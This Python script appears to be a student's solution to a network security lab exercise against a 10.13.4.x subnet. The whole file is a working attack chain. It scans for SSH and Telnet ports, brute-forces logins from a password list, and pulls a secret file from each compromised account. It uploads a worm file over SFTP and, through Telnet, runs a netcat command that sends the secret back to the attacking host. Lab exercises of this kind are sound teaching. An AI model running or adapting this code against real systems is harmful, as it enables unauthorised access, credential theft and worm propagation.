import socket
import paramiko
import telnetlib
from time import sleep
import logging
import threading

# Enable Paramiko logging for debugging
paramiko.util.log_to_file("paramiko.log")
logging.basicConfig(level=logging.WARNING)

# Workaround for SSH protocol banner errors
paramiko.Transport._preferred_kex = (
    'diffie-hellman-group-exchange-sha256',
    'diffie-hellman-group14-sha1',
    'diffie-hellman-group1-sha1'
)

# Helper function to get local IP
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return '127.0.0.1'

# Part 1: Find Vulnerable Machines
def find_vulnerable_machines():
    ssh_ips = []
    telnet_ips = []
    for i in range(256):
        ip = f'10.13.4.{i}'
        for port, ips in [(22, ssh_ips), (23, telnet_ips)]:
            try:
                with socket.socket() as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)  # Keep-alive
                    s.settimeout(2)  # Increased timeout
                    s.connect((ip, port))
                    ips.append(ip)
            except Exception as e:
                print(f"Port {port} scan failed for {ip}: {str(e)}")
                pass
    with open('open_ssh.log', 'w') as f:
        f.write('\n'.join(ssh_ips))
    with open('open_telnet.log', 'w') as f:
        f.write('\n'.join(telnet_ips))

# Part 2: Find Vulnerable Accounts
def find_vulnerable_accounts():
    creds = []
    with open('Q2pwd', 'r') as f:
        for line in f:
            parts = line.strip().split()
            if len(parts) == 2:
                user, pwd = parts
                creds.append((user, pwd))
    
    # Check SSH
    ssh_ips = open('open_ssh.log').read().splitlines()
    for idx, ip in enumerate(ssh_ips):
        if idx % 5 == 0:  # Throttle connections
            sleep(1)
        for user, pwd in creds:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(
                    ip, 
                    username=user, 
                    password=pwd, 
                    timeout=10,
                    banner_timeout=20  # Increased banner timeout
                )
                # Verify connection
                _, stdout, _ = ssh.exec_command('echo "test"')
                if stdout.channel.recv_exit_status() == 0:
                    with open('ssh_accounts.log', 'a') as f:
                        f.write(f"{ip},{user},{pwd}\n")
                ssh.close()
            except Exception as e:
                print(f"SSH Error for {ip}/{user}: {str(e)}")
                continue
    
    # Check Telnet
    telnet_ips = open('open_telnet.log').read().splitlines()
    for ip in telnet_ips:
        for user, pwd in creds:
            try:
                tn = telnetlib.Telnet(ip, 23, timeout=5)
                tn.read_until(b"login: ")
                tn.write(user.encode() + b"\n")
                tn.read_until(b"Password: ")
                tn.write(pwd.encode() + b"\n")
                tn.write(b"exit\n")
                tn.read_all()
                with open('telnet_accounts.log', 'a') as f:
                    f.write(f"{ip},{user},{pwd}\n")
            except Exception as e:
                print(f"Telnet Error for {ip}/{user}: {str(e)}")
                pass

# Part 3: Extract Secrets and Infect
def extract_and_infect():
    attacker_ip = get_local_ip()
    
    # SSH Extraction
    ssh_creds = []
    try:
        with open('ssh_accounts.log', 'r') as f:
            ssh_creds = f.readlines()
    except FileNotFoundError:
        pass
    
    for line in ssh_creds:
        line = line.strip()
        if not line:
            continue
        ip, user, pwd = line.split(',')
        try:
            ssh = paramiko.SSHClient()
            ssh.connect(ip, username=user, password=pwd, timeout=10, banner_timeout=20)
            sftp = ssh.open_sftp()
            # Extract secret
            try:
                with sftp.open(f'/home/{user}/Q2secret', 'r') as secret_file:
                    secret = secret_file.read().strip()
                    with open('Lab2/Solutions/Q2secrets', 'a') as secrets_file:
                        secrets_file.write(f"{ip},{user},{secret}\n")
            except Exception as e:
                print(f"Failed to read secret from {ip}: {e}")
            # Infect with worm
            try:
                sftp.put('Q2worm.py', f'/home/{user}/Q2worm.py')
            except Exception as e:
                print(f"Failed to upload worm to {ip}: {e}")
            sftp.close()
            ssh.close()
        except Exception as e:
            print(f"SSH Error during extraction/infection for {ip}: {e}")
            pass
    
    # Telnet Extraction and Infection
    telnet_creds = []
    try:
        with open('telnet_accounts.log', 'r') as f:
            telnet_creds = f.readlines()
    except FileNotFoundError:
        pass
    
    def start_nc_listener():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((attacker_ip, 1234))
            s.listen(1)
            conn, addr = s.accept()
            with conn:
                data = conn.recv(1024)
                secret = data.decode().strip()
                with open('Lab2/Solutions/Q2secrets', 'a') as f:
                    f.write(f"{ip},{user},{secret}\n")
    
    for line in telnet_creds:
        line = line.strip()
        if not line:
            continue
        ip, user, pwd = line.split(',')
        # Start listener in a thread
        listener_thread = threading.Thread(target=start_nc_listener)
        listener_thread.start()
        sleep(1)  # Wait for listener to start
        try:
            tn = telnetlib.Telnet(ip, 23, timeout=5)
            tn.read_until(b"login: ")
            tn.write(user.encode() + b"\n")
            tn.read_until(b"Password: ")
            tn.write(pwd.encode() + b"\n")
            # Send Q2secret via netcat
            tn.write(f"nc -w 3 {attacker_ip} 1234 < /home/{user}/Q2secret\n".encode())
            tn.write(b"exit\n")
            tn.read_all()
            tn.close()
        except Exception as e:
            print(f"Telnet error with {ip}: {e}")
        listener_thread.join(timeout=5)

if __name__ == "__main__":
    find_vulnerable_machines()
    find_vulnerable_accounts()
    extract_and_infect()
    